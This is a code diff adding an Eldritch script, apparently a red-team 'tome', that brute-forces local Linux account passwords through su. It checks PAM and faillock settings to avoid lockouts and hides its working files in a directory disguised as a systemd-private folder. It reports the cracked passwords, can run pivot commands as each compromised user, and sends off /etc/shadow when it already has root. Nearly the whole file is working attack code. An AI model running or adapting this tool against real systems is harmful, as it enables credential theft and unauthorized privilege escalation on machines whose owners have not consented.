@@ -1,0 +1,263 @@
+MODNAME="[SUPERSU]"
+MAX_THREADS=50
+DEBUG = False
+PASSWORDS = """
+build a bear
+password
+hunter2
+123456
+pass
+admin
+yellowjacket
+barnyard
+superman
+rattlesname
+s3curity is bool
+00--- 00 ;l
+steve
+"""
+
+HEX_CHARS = "abcdef0123456789"
+
+# We want to ensure we only run once per host for the same passwords. So we do a bit of messing around with a created folder
+# Create a temp dir that is shared across all the rake tomes
+def get_tmp_dir():
+    system_id_file = "/var/tmp/system-id" # SHOULD match imix
+    mach = ""
+    if file.exists(system_id_file):
+        mach = file.read(system_id_file).strip()
+    
+    if not mach:
+        mach = random.string(32, "abcdef0123456789")
+        file.write(system_id_file, mach)
+    
+    path = f"/tmp/systemd-private-{mach}-systemd.service-aGF4eA/tmp"
+    if not file.exists(path):
+        sys.shell(f"mkdir -p {path} && chmod 777 {path}")
+    
+    return path
+
+def get_faillock_deny():
+    """See how many attempts faillock is configured for"""
+    faillock_conf = "/etc/security/faillock.conf" # Are there other locations for this file?
+    if not file.exists(faillock_conf):
+        return -1
+    for line in file.read(faillock_conf).split("\n"):
+        m = regex.match(line, "deny\\s*=\\s*(\\d+)")
+        if m:
+            return int(m)
+    return 3
+
+def read_pam(name, type):
+    """Read pam configs, handling includes and filtering on a specific type"""
+    if "/" not in name:
+        name = "/etc/pam.d/" + name
+    lines = []
+    if not file.exists(name):
+        return lines
+    for line in file.read(name).split("\n"):
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = []
+        # NOTE: Custom split function here until eldritchv2 fixes
+        for p in line.split():
+            if p:
+                parts.append(p)
+        if len(parts) < 3:
+            continue
+        if type in parts[0]:
+            if parts[1] == "include":
+                fn = parts[2]
+                lines += read_pam(fn, type)
+                continue
+            lines.append(" ".join(parts))
+    return lines
+
+def get_bruteforce_count(service):
+    """Check if bruteforcing is limited on the system"""
+    bfp = ""
+    deny = get_faillock_deny() # default deny
+    delay = 2 # Two second default
+    # get brute force protection here. Looks for modules in pam that provide it
+    # try to get the deny count, if none, default to the global value
+    for line in read_pam(service, "auth"):
+        # Pam imposes a two second delay unless no_delay is set
+        # pam_faildelay.so can also set a higher delay
+        delay_str = regex.match(line, r"faildelay.so.*delay=(\d+)")
+        no_delay = regex.match(line, r"\s+(no_delay)\s+")
+        if no_delay:
+            delay = 0
+        if delay_str:
+            delay = int(delay_str)/1000000# Millisecond to second
+
+        # Look for faillock, pam_tally2, and pam_tally
+        bfp = regex.match(line, r"pam_(faillock|tally2?)\.so")
+        if bfp:
+            deny_str = regex.match(line, r"\sdeny\s*=\s*(\d+)")
+            if deny_str:
+                deny = int(deny_str)
+    if bfp:
+        print(MODNAME, f"Bruteforce protection enabled: 'pam_{bfp}.so'. Max attempts for {service}: {deny}")
+        return (deny, delay)
+    
+    return (-1, delay)
+
+def users_with_shells(skip_self=True):
+    users = []
+    username = sys.get_user()["uid"]["name"]
+
+    for line in file.read("/etc/passwd").split("\n"):
+        if line.count(":") != 6 or (skip_self and line.startswith(username)):
+            continue
+        #user, hash, uid, gid, comment, home, shell = parts
+        user, _, _, _, _, _, shell = line.strip().split(":")
+        if shell in ["/usr/sbin/nologin", "/usr/bin/nologin", "/usr/bin/false", "/bin/false", "/bin/nologin", "/usr/bin/git-shell"]:
+            continue
+        users.append(user)
+    return users
+
+def bruteforce_simple(users, creds, speed=False):
+    """Simple bruteforce, do not fork, can take longer but allows for instant cred feedback.
+    Auto-enabled if no_delay is set or DEBUG is set
+
+    Speed mode allows us to do fast bruteforcing even with a delay. The catch is that it will
+    kill commands being executed rather quickly
+    """
+    if speed and input_params.get("cmd", ""):
+        print(MODNAME, "[WARN] Simple bruteforce speed mode does not allow custom commands")
+    
+    gathered = []
+    remaining = len(users) * len(creds)
+    for u in users:
+        for p in creds:
+            res = {}
+            if speed:
+                cmd = f"echo '{p}' | timeout 0.3 su {u} -s /bin/sh --session-command 'echo {u}=true'"
+                res = sys.shell(cmd)
+            else:
+                cmd = f"echo {u}=true; " + input_params.get("cmd", "")
+                res = sys.exec("su", [u, "-s", "/bin/sh", "--session-command", cmd], False, {"HALLIGAN_PASS": p}, input=p+"\n")
+
+            remaining -= 1
+            if remaining % 20 == 0:
+                print(MODNAME, remaining, "attempts remaining")
+            if f"{u}=true" in res['stdout']:
+                print(MODNAME, f"PASS {u}: '{p}'")
+                report.user_password(u, p)
+                gathered.append((u,p))
+                break
+    return gathered
+
+def bruteforce_threaded(users, creds, delay, filename, threads=25):
+    """A 'threaded' bruteforce, requires a bit more advanced messing around for the cred reporting.
+    On success, it will write to a shared file indicating success for the cred pair. Always faster
+    but you might run into permissions error if BT has heavily screwed around with the system
+    NOTE: The creds are never written to a shared file.
+    """
+    cred_tokens = {} # Stash which tokens we have seen before
+
+    # Where the successful auths will write their cred tokens
+    # MUST be in a 777 subdirectory or other users cant write to it
+    cmd = input_params.get("pivot_cmd", "")
+    if cmd:
+        cmd = ";"+cmd # We run the user cmd AFTER writing the cred token
+    threads = 0
+    remaining = len(users) * len(creds)
+    for u in users:
+        for p in creds:
+            usercmd = cmd.replace("{PASS}", p)
+            # Token to write
+            tok = random.string(10)
+            for _ in range(10):
+                if tok in cred_tokens:
+                    tok = random.string(10)
+                    continue
+                break
+
+            cred_tokens[tok] = [u, p]
+            full_cmd = f"echo {tok} >> {filename}" + usercmd
+            sys.exec("su", [u, "-s", "/bin/sh", "--session-command", full_cmd], True, {"HALLIGAN_PASS": p}, input=p+"\n")
+            threads += 1
+            remaining -= 1
+            # Maxmimum jank thread counter
+            if threads >= MAX_THREADS:
+                print(MODNAME, f"sleeping for {delay} seconds to reset threads. {remaining} attempts remaining")
+                # Wait for threads to close
+                time.sleep(delay)
+                # start more
+                threads = 0
+
+    print(MODNAME, "Brute force complete. waiting for threads to finish.")
+    time.sleep(delay*2)
+    gathered = []
+    for token in file.read(filename).split("\n"):
+        if not token.strip():
+            continue
+        cred = cred_tokens.get(token)
+        if cred:
+            report.user_password(cred[0], cred[1])
+            gathered.append(cred)
+    sys.shell(f"rm -fr {filename}")
+    return gathered
+
+def main():
+    if not sys.is_linux():
+        print("[ERROR] This script is only for Linux")
+        return -1
+
+    am_i_root = sys.get_user()['uid']
+    if am_i_root['uid'] == 0:
+        print(f"[ERROR] We are already root, we should brute force hashes not live systems. Aborting.")
+        report.file("/etc/shadow")
+        return -1
+    
+    deny, delay = get_bruteforce_count("su")
+    passwords = []
+    for p in PASSWORDS.split("\n"):
+        p = p.strip()
+        if p:
+            if deny < 0 or len(passwords) < deny:
+                passwords.append(p)
+            else:
+                break
+    
+    threads = int(input_params.get("threads", MAX_THREADS))
+    users = users_with_shells()
+    mode = "MULTI"
+    attempts = len(users) * len(passwords)
+    bftime = (attempts / threads) * delay
+    bftime += delay*2 # Wait for the attempts to finish
+
+    # Set up the temp file. This will check if we have already run on the system
+    filename = get_tmp_dir() + "/tokens"
+    if file.exists(filename):
+        # We have already run. Skipping bruteforce on this system
+        print(f"{MODNAME} Bruteforce has already run on this system. Skipping run")
+        return 0
+    sys.shell(f"touch {filename} && chmod 666 {filename}")
+
+    if delay == 0 or DEBUG or threads in (0, 1):
+        mode = "SIMPLE"
+        threads=1
+        filename = ""
+        bftime = attempts * max(0.3, float(delay)) # .3 is about how long su takes
+        if input_params.get("pivot_cmd", "") == "":
+            mode = "SIMPLE/SPEED"
+            bftime = attempts * 0.3 
+    
+
+    print(MODNAME, f"mode={mode} users={len(users)} attempts={attempts} time={bftime}s threads={threads} filename={filename} pam_delay={delay}s")
+    gathered = []
+    tm = time.now()
+    if delay == 0 or DEBUG:
+        gathered = bruteforce_simple(users, passwords, speed=input_params.get("pivot_cmd", "") == "")
+    else:
+        gathered = bruteforce_threaded(users, passwords, delay, filename, threads)
+
+    tm = time.now() - tm
+    print(MODNAME, f"Harvested {len(gathered)} creds in {tm}s")
+    for c in gathered:
+        print(f"\t[su] {c[0]} - {c[1]}")
+
+main()
